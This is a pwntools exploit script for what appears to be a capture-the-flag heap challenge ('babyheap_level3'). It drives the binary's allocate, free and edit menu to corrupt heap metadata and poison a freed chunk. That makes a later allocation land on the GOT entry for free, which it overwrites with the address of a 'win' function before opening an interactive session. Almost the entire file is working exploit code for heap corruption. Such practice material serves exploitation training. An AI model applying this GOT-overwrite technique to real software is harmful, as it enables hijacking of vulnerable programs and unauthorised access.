#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/babyheap_level1
from pwn import *
import os

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyheap_level3')
os.chdir('/challenge')
context.terminal = ["tmux", "split"]
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break print_menu
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

io = start()

END_OF_MENU = b"Choice:"

def malloc(p, size, content):
    p.sendline(b"1")
    p.recvuntil(b"chunk?:")
    p.sendline(b"%d" % (size))
    p.recvuntil(b"Content:")
    p.sendline(b"%b" % (content))
    print(p.recvline()) 
    p.recvuntil(END_OF_MENU)

def free(p, index):
    p.sendline(b"3")
    p.recvuntil(b"Index:")
    p.sendline(b"%d" % (index))
    print(p.recvline()) 
    p.recvuntil(END_OF_MENU)

def edit(p, index, content):
    p.sendline(b"2")
    p.recvuntil(b"Index:")
    p.sendline(b"%d" % (index))
    p.recvuntil(b"content:")
    p.sendline(b"%b" % (content)) 
    print(p.recvline()) 
    p.recvuntil(END_OF_MENU)


def launch_attack(p):
    malloc(p, 8, b'a')
    malloc(p, 8, b'a')
    free(p, 1)
    content = b'a'*(0x20 - 8) + b'\x21' + b'\x00'*7 + p64(exe.got['free']) 
    free(p, 0)     
    malloc(p, 8, content)
    malloc(p, 8, b'a')
    malloc(p,8, p64(exe.symbols.win ))
    p.interactive()

io.recvuntil(END_OF_MENU)
launch_attack(io)
io.interactive()